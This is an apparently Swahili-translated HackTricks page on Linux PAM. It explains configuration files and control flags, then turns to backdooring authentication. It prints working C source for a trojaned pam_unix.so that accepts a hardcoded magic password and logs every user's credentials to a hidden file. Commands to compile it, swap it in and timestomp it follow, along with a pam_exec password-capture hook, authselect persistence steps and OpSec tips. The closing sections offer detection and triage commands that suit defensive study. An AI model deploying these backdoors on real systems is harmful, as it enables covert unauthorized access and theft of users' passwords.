# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Taarifa za Msingi

**PAM (Pluggable Authentication Modules)** hufanya kazi kama utaratibu wa usalama una **thibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta**, na kudhibiti ufikiaji wao kulingana na vigezo mbalimbali. Ni kama mlinzi wa kidijitali wa lango, anayehakikisha kuwa watumiaji walioidhinishwa pekee wanaweza kutumia huduma mahususi, huku ikiwezekana ikipunguza matumizi yao ili kuzuia mfumo kulemewa.

#### Faili za Usanidi

- **Solaris na mifumo inayotegemea UNIX** kwa kawaida hutumia faili kuu ya usanidi iliyo katika `/etc/pam.conf`.
- **Mifumo ya Linux** hupendelea muundo wa saraka, kwa kuhifadhi usanidi mahususi wa huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi ya huduma ya kuingia inapatikana katika `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Mfano wa usanidi wa PAM wa huduma ya kuingia unaweza kuonekana hivi:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Maeneo ya Usimamizi ya PAM**

Maeneo haya, au makundi ya usimamizi, yanajumuisha **auth**, **account**, **password**, na **session**, kila moja ikiwa na jukumu tofauti katika mchakato wa authentication na usimamizi wa session:<sup>[[1]](#references)</sup>

- **Auth**: Huthibitisha utambulisho wa mtumiaji, mara nyingi kwa kuomba password.
- **Account**: Hushughulikia uthibitishaji wa account, ikikagua masharti kama uanachama wa group au vikwazo vya muda wa siku.
- **Password**: Hudhibiti masasisho ya password, ikijumuisha ukaguzi wa complexity au kuzuia dictionary attacks.
- **Session**: Hudhibiti vitendo wakati wa kuanza au kumaliza service session, kama vile ku-mount directories au kuweka resource limits.

#### **Vidhibiti vya PAM Modules**

Controls huamua jinsi module inavyojibu mafanikio au kushindwa, na kuathiri mchakato mzima wa authentication. Hivi ni pamoja na:<sup>[[1]](#references)</sup>

- **Required**: Kushindwa kwa required module husababisha kushindwa hatimaye, lakini baada ya modules zote zinazofuata kukaguliwa.
- **Requisite**: Kusimamishwa mara moja kwa mchakato baada ya kushindwa.
- **Sufficient**: Mafanikio huruka ukaguzi uliobaki wa realm hiyo hiyo isipokuwa module inayofuata ishindwe.
- **Optional**: Husababisha kushindwa tu ikiwa ndiyo module pekee kwenye stack.

#### Maana za Offensive Zinazohitajika

Wakati wa kuweka backdoor kwenye PAM, **mahali pa rule iliyowekwa** mara nyingi ni muhimu zaidi kuliko payload yenyewe:

- `include` na `substack` huvuta rules kutoka files nyingine, kwa hiyo kuhariri `sshd` kunaweza kuathiri SSH pekee, ilhali kuhariri `system-auth`, `common-auth`, au shared stack nyingine kunaweza kuathiri services kadhaa kwa wakati mmoja.
- PAM pia inaunga mkono bracketed controls kama `[success=1 default=ignore]`. Hizi zinaweza kutumiwa vibaya **kuruka module moja au zaidi** baada ya custom check kufanikiwa, badala ya kuonekana wazi kuwa `pam_unix.so` imebadilishwa.
- `module-path` inaweza kuwa **absolute** (`/usr/lib/security/pam_custom.so`) au **relative** kwa default PAM module directory. Kwenye Linux systems za kisasa, directories halisi mara nyingi huwa `/lib/security`, `/lib64/security`, `/usr/lib/security`, au multiarch paths kama `/usr/lib/x86_64-linux-gnu/security`.

Ushauri wa haraka kwa operator: kila mara ramani **full service graph** kabla ya kufanya patching. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros, au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine, inamaanisha implant hiyo hiyo ya mstari mmoja inaweza kuenea kwa kiwango kikubwa zaidi kuliko ilivyokusudiwa.

#### Mfano wa Scenario

Katika setup yenye auth modules nyingi, mchakato hufuata mpangilio mkali. Ikiwa module ya `pam_securetty` itagundua kuwa login terminal hairuhusiwi, root logins huzuiwa, lakini modules zote bado huchakatwa kutokana na status yake ya "required". `pam_env` huweka environment variables, ambazo zinaweza kusaidia user experience. Modules za `pam_ldap` na `pam_unix` hushirikiana ku-authenticate user, huku `pam_unix` ikijaribu kutumia password iliyotolewa awali, jambo linaloongeza efficiency na flexibility katika authentication methods.


## Backdooring PAM – Hooking `pam_unix.so`

Persistence trick ya kawaida katika Linux environments zenye thamani kubwa ni **kubadilisha PAM library halali na drop-in iliyowekewa trojan**. Kwa kuwa kila SSH / console login huishia kuita `pam_unix.so:pam_sm_authenticate()`, mistari michache ya C inatosha kukamata credentials au kutekeleza password ya *magic* ya kupita authentication.<sup>[[2]](#references)</sup>

### Cheatsheet ya Compilation
<details>
<summary>Mfano wa trojan ya `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compile na stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Vidokezo vya OpSec
1. **Atomic overwrite** – andika kwenye faili la muda kisha tumia `mv` kuliweka mahali pake ili kuepuka libraries zilizoandikwa nusu ambazo zingezuiya SSH.
2. Kuweka faili la log kama `/usr/bin/.dbus.log` huchanganyika na mabaki halali ya desktop.
3. Weka symbol exports zikiwa zilezile (`pam_sm_setcred`, n.k.) ili kuepuka tabia isiyo sahihi ya PAM.

### Utambuzi
* Linganisha MD5/SHA256 ya `pam_unix.so` na ile ya package ya distro.
* `rpm -V pam` au `debsums -s libpam-modules` ili kugundua libraries zilizobadilishwa bila hashing ya mikono.
* Kagua faili zenye ruhusa ya kuandikiwa na kila mtu au umiliki usio wa kawaida chini ya `/lib/security/`.
* Kanuni ya `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Tafuta kwenye PAM configs modules zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Amri za quick triage (baada ya compromise au threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Kutumia vibaya `pam_exec` kwa persistence
Badala ya kubadilisha `pam_unix.so`, njia isiyoingilia sana ni kuongeza mstari wa `pam_exec` katika `/etc/pam.d/sshd` ili kila SSH login ianzishe implant huku stack ya kawaida ikiendelea kubaki:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` hupokea metadata ya PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Ukiweka `expose_authtok`, helper anaweza pia kusoma password kutoka `stdin` wakati wa awamu za `auth` au `password`. Ikiwa unataka helper aendeshe kwa effective UID badala ya real UID, ongeza `seteuid`.

Maelezo ya vitendo:

- `session optional pam_exec.so ...` ni bora kwa **post-login actions** kama vile kufungua tena sockets au kuanzisha daemon iliyojitenga.
- `auth optional pam_exec.so quiet expose_authtok ...` ndilo chaguo la kawaida kwa **credential capture** kwa sababu huendeshwa kabla session haijafunguliwa.
- `type=session` au `type=auth` inaweza kutumika kuzuia execution kwenye awamu maalum ya PAM na kuepuka execution maradufu yenye kelele.

### Surviving distro tooling: `authselect`

Kwenye RHEL, CentOS Stream, Fedora, na derivative systems, mabadiliko ya moja kwa moja kwenye files zinazozalishwa kama `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kuandikwa juu na `authselect`**. Kwa persistence, operators mara nyingi hufanyia patch profile custom inayotumika chini ya `/etc/authselect/custom/<profile>/`, kisha kuichagua tena au kuitumia.

Typical workflow ukiwa na root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Hili ni muhimu kwa offense na triage zote mbili: ikiwa `/etc/pam.d/system-auth` ina banner `Generated by authselect` na `Do not modify this file manually`, basi persistence point halisi inaweza kuwa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.

### Tradecraft ya hivi karibuni iliyoonekana kwenye mazingira halisi

Ripoti za hivi karibuni za 2025 kuhusu **Plague** Linux backdoor zilionyesha wazo hilo kuu likiendelezwa zaidi: component hasidi ya PAM yenye **static bypass password**, pamoja na usafishaji wa SSH-related environment variables na shell history (`HISTFILE=/dev/null`) ili kupunguza session traces baada ya login.<sup>[[3]](#references)</sup> Hii ni hunting pattern muhimu kwa sababu backdoor logic inaweza kuwa ndani ya PAM huku stealth artifacts zikionekana tu **baada ya** authentication kufanikiwa.


## Marejeo

- [1] [pam.conf(5) / pam.d(5) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Kitabu cha Mbinu cha Covert Operator: Kuingia kwa Nguvu kwenye Mitandao ya Mawasiliano ya Kimataifa - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Backdoor Mpya ya Linux Inayotumia PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
